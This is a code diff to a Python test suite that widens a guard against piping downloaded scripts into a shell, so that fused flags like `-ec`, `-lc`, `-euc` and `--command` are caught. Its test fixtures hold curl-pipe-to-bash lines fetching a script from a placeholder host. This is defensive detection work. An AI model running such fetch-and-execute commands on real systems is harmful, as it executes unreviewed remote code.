@@ -116,7 +116,12 @@ _FETCH = re.compile(r"(?:[\w./-]*/)?(?:curl|wget)")
 #
 # Where the span SITS does distinguish them. `sh -c "…"` is the only construct here that takes a
 # command as a string, so that is the only place the quotes get opened.
-_DASH_C = "-c"
+#
+# Short options fuse: `sh -ec`, `bash -lc`, `sh -euc` all end in `c` and all take the next word
+# as the command. Matching the flag exactly as `-c` missed every fused spelling -- including
+# `bash -lc '…'`, which this repo already writes in docker/bake_kernel_cache.py. A long `--command`
+# counts too; `--config` and other `c`-words must not, hence the exact long-form match.
+_TAKES_A_COMMAND_STRING = re.compile(r"-[A-Za-z]*c|--command")
 
 
 def _tokenize(line: str) -> list[str]:
@@ -143,13 +148,13 @@ def _tokenize(line: str) -> list[str]:
 
 
 def _is_a_command_string(tokens: list[str], index: int) -> bool:
-    """Is `tokens[index]` the command string of a `sh -c` (or `bash -c`, `zsh -c`, …)?
+    """Is `tokens[index]` the command string of a `sh -c` (or `bash -lc`, `zsh -euc`, …)?
 
     Scans left past the wrapper's other flags to the command word, so `bash -eu -c "…"` and
     `sudo sh -c "…"` are recognized. Only a shell counts: `jq -c "…"` passes `-c` too, and its
     argument is a filter, not a command.
     """
-    if index == 0 or tokens[index - 1] != _DASH_C:
+    if index == 0 or not _TAKES_A_COMMAND_STRING.fullmatch(tokens[index - 1]):
         return False
     for tok in reversed(tokens[: index - 1]):
         if tok.startswith("-"):
@@ -428,6 +433,14 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param(
             'RUN sudo sh -c "curl -sSL https://x.example/i.sh|bash"\n', id="dash-c-behind-sudo"
         ),
+        # Short options FUSE. `-ec`, `-lc`, `-euc` all end in `c` and all take the next word as
+        # the command, so matching the flag exactly as `-c` missed every fused spelling --
+        # including `bash -lc`, which this repo already writes in docker/bake_kernel_cache.py.
+        pytest.param('RUN sh -ec "curl -sSL https://x.example/i.sh|bash"\n', id="fused-flags-ec"),
+        pytest.param("RUN bash -lc 'curl -sSL https://x.example/i.sh | sh'\n", id="fused-flags-lc"),
+        pytest.param(
+            'RUN sh -euc "curl -sSL https://x.example/i.sh | bash"\n', id="fused-flags-euc"
+        ),
     ],
 )
 def test_the_pipe_to_shell_guard_catches_what_it_claims_to(snippet: str, tmp_path: Path):
@@ -533,6 +546,11 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # `-c` is not exclusive to shells: jq takes one too, and its argument is a filter.
         pytest.param(
             'jq -c "curl https://x.example/i.sh | bash" /tmp/f', id="dash-c-on-a-non-shell"
+        ),
+        # Accepting fused short options must not turn every long flag ending in a c-word into a
+        # command opener: `--config` is not `--command`.
+        pytest.param(
+            'sh --config "curl https://x.example/i.sh | bash"', id="long-flag-is-not-command"
         ),
     ],
 )
